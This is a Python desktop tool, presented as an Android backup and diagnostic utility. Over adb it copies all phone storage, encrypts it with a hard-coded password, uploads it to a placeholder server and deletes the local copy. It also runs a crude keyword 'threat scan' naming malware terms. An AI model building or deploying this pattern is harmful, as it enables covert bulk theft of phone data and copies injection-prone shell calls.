import os
import subprocess
import threading
import shutil
import requests
import tkinter as tk
from tkinter import scrolledtext, messagebox

PASSWORD = "YourSecurePassword123"
SERVER_URL = "http://YOUR_SERVER_IP:5000/upload"
LOCAL_BACKUP_NAME = "phone_backup.7z"
TEMP_DIR = "backup_temp"

def run_cmd(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def get_device_report():
    model = run_cmd("adb shell getprop ro.product.model")
    android_version = run_cmd("adb shell getprop ro.build.version.release")
    battery = run_cmd("adb shell dumpsys battery")
    storage = run_cmd("adb shell df /sdcard")
    report = "=== ANDROID SYSTEM HEALTH REPORT ===\n\n"
    report += f"Device Model: {model or 'Unknown'}\n"
    report += f"Android Version: {android_version or 'Unknown'}\n\n"
    report += "--- Battery Status ---\n" + f"{battery}\n\n"
    report += "--- Storage Status ---\n" + f"{storage}\n"
    return report


def scan_device():
    """Basic heuristic scan for suspicious packages/files on the device."""
    findings = []
    pkgs = run_cmd("adb shell pm list packages")
    suspicious = ["metasploit", "payload", "rat", "trojan", "keylogger", "backdoor"]
    for line in pkgs.splitlines():
        low = line.lower()
        if any(s in low for s in suspicious):
            findings.append(f"Suspicious package: {line}")
    files = run_cmd("adb shell find /sdcard -type f \( -name '*.apk' -o -name '*.sh' \) 2>/dev/null")
    for f in files.splitlines():
        if any(s in f.lower() for s in suspicious):
            findings.append(f"Suspicious file: {f}")
    if not findings:
        findings.append("No obvious threats detected.")
    return "\n".join(findings)

def do_backup(status_cb):
    try:
        status_cb("Checking for connected device...")
        devices = run_cmd("adb devices")
        lines = devices.splitlines()[1:]
        if not any("device" in l for l in lines):
            status_cb("No Android device detected.")
            messagebox.showerror("Error", "No Android device detected or USB Debugging disabled.")
            return

        status_cb("Pulling files...")
        os.makedirs(TEMP_DIR, exist_ok=True)
        run_cmd("adb pull /sdcard/ " + os.path.join(TEMP_DIR, "internal_storage"))
        storage_list = run_cmd("adb shell ls /storage/")
        for line in storage_list.splitlines():
            if line.strip() and line not in ["emulated", "self", "salf", "license"]:
                run_cmd(f"adb pull /storage/{line}/ " + os.path.join(TEMP_DIR, f"sdcard_{line}"))

        status_cb("Encrypting archive...")
        zip_cmd = f'7z a -p"{PASSWORD}" -mhe=on {LOCAL_BACKUP_NAME} ./{TEMP_DIR}/*'
        run_cmd(zip_cmd)

        status_cb("Uploading to server...")
        if os.path.exists(LOCAL_BACKUP_NAME):
            with open(LOCAL_BACKUP_NAME, "rb") as f:
                requests.post(SERVER_URL, files={"file": f})

        status_cb("Cleaning up...")
        shutil.rmtree(TEMP_DIR, ignore_errors=True)
        if os.path.exists(LOCAL_BACKUP_NAME):
            os.remove(LOCAL_BACKUP_NAME)

        status_cb("Backup complete.")
        messagebox.showinfo("Done", "Backup and upload completed successfully.")
    except Exception as e:
        status_cb(f"Error: {e}")
        shutil.rmtree(TEMP_DIR, ignore_errors=True)
        if os.path.exists(LOCAL_BACKUP_NAME):
            os.remove(LOCAL_BACKUP_NAME)

def main():
    app = tk.Tk()
    app.title("Android Backup & Diagnostic Tool")
    app.geometry("520x460")

    tk.Label(app, text="Android Backup & Diagnostic Tool", font=("Arial", 12, "bold")).pack(pady=10)

    text_area = scrolledtext.ScrolledText(app, wrap=tk.WORD, width=58, height=16)
    text_area.insert(tk.END, get_device_report())
    text_area.config(state="disabled")
    text_area.pack(padx=10, pady=5)

    status_var = tk.StringVar(value="Idle")
    status_label = tk.Label(app, textvariable=status_var, anchor="w")
    status_label.pack(fill="x", padx=10)

    def start():
        btn.config(state="disabled")
        def worker():
            status_var.set("Scanning device...")
            scan_result = scan_device()
            status_var.set(scan_result)
            do_backup(lambda m: status_var.set(m))
            btn.config(state="normal")
        threading.Thread(target=worker, daemon=True).start()

    btn = tk.Button(app, text="Start Backup & Upload", command=start, width=22)
    btn.pack(pady=10)

    scan_btn = tk.Button(app, text="Scan for Threats", command=lambda: messagebox.showinfo("Scan Result", scan_device()), width=22)
    scan_btn.pack(pady=5)

    app.mainloop()

if __name__ == "__main__":
    main()

# Packaging:
# pyinstaller --onefile backup_tool.py
